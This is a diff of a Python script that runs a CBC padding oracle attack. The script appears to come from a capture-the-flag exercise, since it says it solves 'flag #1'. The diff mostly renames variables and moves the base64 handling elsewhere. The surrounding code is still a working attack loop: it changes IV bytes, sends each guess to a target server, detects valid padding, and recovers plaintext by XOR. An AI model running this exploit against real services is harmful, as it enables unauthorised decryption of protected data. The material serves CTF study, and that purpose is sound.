@@ -3,12 +3,10 @@ Specific for executing a padding oracle attack. Necessary for solving flag #1.
 '''
 
 
-from time import sleep
-from settings import CBC_BLOCKSIZE, TARGET, USE_THREADS, NUM_OF_BLOCKS, ORIGINAL_PAYLOAD, SKIPS_FILE_LOCATION
-from help import add2bytes, xor2bytes, make_request, replace_chars
+from settings import CBC_BLOCKSIZE, TARGET, USE_THREADS, NUM_OF_BLOCKS, ORIGINAL_PAYLOAD, FLAG_1_SKIPS_FILE_LOCATION
+from help import add2bytes, xor2bytes, make_request, ENCODING
 from multiprocessing.pool import ThreadPool
 from datetime import datetime
-from base64 import b64encode
 import json
 import os
 
@@ -17,11 +15,11 @@ def load_skips():
     '''
     Loads the skips
     '''
-    if not os.path.isfile(SKIPS_FILE_LOCATION):
+    if not os.path.isfile(FLAG_1_SKIPS_FILE_LOCATION):
         return None
 
 
-    with open(SKIPS_FILE_LOCATION, 'r') as skips_file:
+    with open(FLAG_1_SKIPS_FILE_LOCATION, 'r') as skips_file:
         skips = skips_file.read()
 
         skips = json.loads(skips)
@@ -34,7 +32,7 @@ def save_skips(skips: dict):
     Saves the skips to a json file
     '''
 
-    with open(SKIPS_FILE_LOCATION, 'w') as skips_file:
+    with open(FLAG_1_SKIPS_FILE_LOCATION, 'w') as skips_file:
         # skips = json.loads((skips))
         skips = json.dumps(skips, sort_keys=True, indent=4)
         skips_file.write(skips)
@@ -57,29 +55,26 @@ def __exec_padding_oracle_attack(original_iv: bytes, modifiedDemoData: bytes, nu
     proposed_iv = [b'\x00']*CBC_BLOCKSIZE
     for num_of_byte in range(-1, -CBC_BLOCKSIZE-1, -1):# Which byte of the IV to test
 
-        what_byte = 0
+        # What to add to the specific byte of the IV
+        how_much_to_add = 0
 
+        # If there is a skip use it
         if str(num_of_byte) in solutions:
-            what_byte = solutions[str(num_of_byte)]
+            how_much_to_add = solutions[str(num_of_byte)]
 
         while True:
             
             # Propose an IV to send
             proposed_iv_temp = proposed_iv.copy()
 
-            # Change the appropriate byte from 0 to 255
+            # Add to the appropriate byte a value from 0 to 255
             proposed_iv_temp[num_of_byte] = add2bytes(
-                proposed_iv_temp[num_of_byte], bytes([what_byte])
+                proposed_iv_temp[num_of_byte], bytes([how_much_to_add])
             )
             proposed_iv_temp = b''.join(proposed_iv_temp)
             
             # Add the rest of the demo data
             payload_temp = proposed_iv_temp + modifiedDemoData
-
-            # Prepare it for the request
-            payload_temp = b64encode(payload_temp)
-            payload_temp = payload_temp.decode('utf-8')
-            payload_temp = replace_chars(payload_temp, reverse=True)
             
             result = make_request(TARGET, payload_temp)
 
@@ -90,7 +85,7 @@ def __exec_padding_oracle_attack(original_iv: bytes, modifiedDemoData: bytes, nu
                 byte_solution = proposed_iv_temp[num_of_byte:]
                 
                 # Save the solution
-                solutions[str(num_of_byte)] = what_byte
+                solutions[str(num_of_byte)] = how_much_to_add
                 
                 # Calculate what valid padding we caused
                 caused_valid_padding = bytes([abs(num_of_byte)]*abs(num_of_byte))
@@ -99,7 +94,7 @@ def __exec_padding_oracle_attack(original_iv: bytes, modifiedDemoData: bytes, nu
                 intermediary = xor2bytes(proposed_iv_temp[num_of_byte:], caused_valid_padding)
                 
                 original_plaintext = xor2bytes(original_iv[num_of_byte:], intermediary)
-                original_plaintext = original_plaintext.decode('utf-8')
+                original_plaintext = original_plaintext.decode(ENCODING)
 
                 print(f"\nBlock #{num_of_block}: Caught {byte_solution}.\nProgress thus far: <{repr(original_plaintext): >{CBC_BLOCKSIZE+2}}>")
 
@@ -118,8 +113,8 @@ def __exec_padding_oracle_attack(original_iv: bytes, modifiedDemoData: bytes, nu
                     proposed_iv[xor_res_byte_ind] = xor_res_byte
                 break
             
-            what_byte = what_byte+1
-            if what_byte>=256:
+            how_much_to_add = how_much_to_add+1
+            if how_much_to_add>=256:
                 # No solution has been found, something is wrong
                 raise Exception("All responses were the same. Have you found the error that talks about the padding?")
     
